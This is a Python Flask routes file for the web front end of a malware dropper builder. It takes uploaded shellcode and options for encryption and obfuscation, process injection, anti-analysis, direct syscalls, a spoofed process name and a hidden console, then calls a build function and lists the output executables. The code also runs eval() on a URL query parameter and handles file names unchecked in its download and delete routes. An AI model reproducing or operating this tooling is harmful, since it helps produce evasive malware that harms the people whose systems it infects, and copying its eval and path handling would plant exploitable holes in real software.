import os
import re
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, send_from_directory, jsonify, flash
from urllib.parse import urlencode
from utils import *
from dropper_builder import fetch_available_modules, build_dropper


def init_routes(app):
    @app.route("/")
    def index(messages={}):
        files = os.listdir(app.config['OUTPUT_FOLDER'])

        file_details = []
        for file in files:
            file_path = os.path.join(app.config['OUTPUT_FOLDER'], file)
            file_size = os.path.getsize(file_path)
            file_modified_time = os.path.getmtime(file_path)
            file_modified_time_str = datetime.fromtimestamp(file_modified_time).strftime('%Y-%m-%d %H:%M:%S')
            file_details.append({
                'name': file,
                'size': file_size,
                'modified_time': file_modified_time_str,
                'modified_timestamp': file_modified_time,
                'entropy': compute_pe_file_entropy(os.path.join(app.config['OUTPUT_FOLDER'], file))
            })
        
        file_details.sort(key=lambda x: x['modified_timestamp'], reverse=True)
        return render_template('index.html', files=file_details, messages=messages)

    @app.route("/config", methods=["GET"])
    def config(messages={}):
        messages_param = request.args.get("messages")
    
        if messages_param:
            try:
                # Convert string back to a dictionary
                messages_dict = eval(messages_param)
                for category, msg in messages_dict.items():
                    flash(msg, category)
            except Exception as e:
                flash("Invalid message format", "error")
        
        modules = fetch_available_modules()
        return render_template("dropper_config.html", modules=modules)

    
    @app.route('/download/<filename>')
    def download_file(filename):
        return send_from_directory(app.config['OUTPUT_FOLDER'], filename, as_attachment=True)

    @app.route('/delete/<filename>', methods=['DELETE'])
    def delete_file(filename):
        file_path = os.path.join(app.config['OUTPUT_FOLDER'], filename)
        
        if os.path.exists(file_path):
            os.remove(file_path)
            return jsonify({"message": f"'{filename}' has been deleted."}), 200
        else:
            return jsonify({"error": f"'{filename}' not found."}), 404
    
    @app.route('/upload', methods=['POST'])
    def upload_file():
        # Initialize a dictionary to store form data
        encryption_method = ""
        form_data = {}
        placeholder_options = {}
        preprocessing_macros = []

        # Add all form inputs to form_data
        for key, value in request.form.items():
            form_data[key] = value
        
        # Handle preprocessing inputs
        if form_data.get('encryption & obfuscation', None):
            encryption_method = (form_data.get('encryption & obfuscation') or "").replace(' ', '_').upper()
            preprocessing_macros.append(encryption_method)
            preprocessing_macros.append("ENCRYPTED_PAYLOAD")
        if form_data.get('injection', None):
            preprocessing_macros.append(form_data.get('injection', '').replace(' ', '_').upper())
        if 'anti_analysis' in form_data:
            preprocessing_macros.append("ANTI_ANALYSIS_ENABLED")
        if form_data.get('debug', None):
            preprocessing_macros.append("DEBUG")
        if len(request.form.getlist('process_name')) > 0:
            preprocessing_macros.append("PROCESS_NAME_ENABLED")
        if form_data.get('syscalls', None):
            preprocessing_macros.append(form_data.get('syscalls', '').replace(' ', '_').upper())
            preprocessing_macros.append("SYSCALL_ENABLED")
        print(f">>> preprocessing_macros:\n{preprocessing_macros}\n>>>\n")
        
        # Handle placeholder inputs
        placeholder_options['hide_console'] = form_data.get('hide_console')
                
        process_names =  [f"{p_name}" for p_name in request.form.getlist('process_name') if p_name.strip()]
        if process_names:
            placeholder_options['process_name'] = process_names[0]
        if placeholder_options.get('process_name', None) and not placeholder_options.get('process_name').endswith(".exe"):
            placeholder_options['process_name'] = f"{placeholder_options['process_name']}.exe"

        # Handle file upload
        if 'shellcode' in request.files:
            file = request.files['shellcode']
            if file.filename != '':
                placeholder_options['shellcode'] = extract_shellcode(file.read(), file.filename.split(".")[-1])
            else:
                placeholder_options['shellcode'] = None

        if not placeholder_options['shellcode'] and form_data.get('shellcode_text'):
            cleaned = re.findall(r'0x[0-9A-Fa-f]{2}', form_data.get('shellcode_text'))
            placeholder_options['shellcode'] = ', '.join(cleaned)

        # Handle filename and file extension
        placeholder_options['out_filename'] = f"{form_data.get('filename')}{form_data.get('file_extension')}"
        print(f">>> placeholder_options:\n{placeholder_options}\n>>>\n")        

        if not placeholder_options.get("shellcode"):
            messages = {"error": "Empty shellcode"}
            query_string = urlencode({"messages": str(messages)})
            redirect_url = f"/config?{query_string}"
            return redirect(redirect_url)
        
        # Call build_dropper with the form data
        build_dropper(
            encryption_method=encryption_method,
            preprocessing_macros=preprocessing_macros,
            placeholder_options=placeholder_options,
        )

        return redirect(url_for('index'))
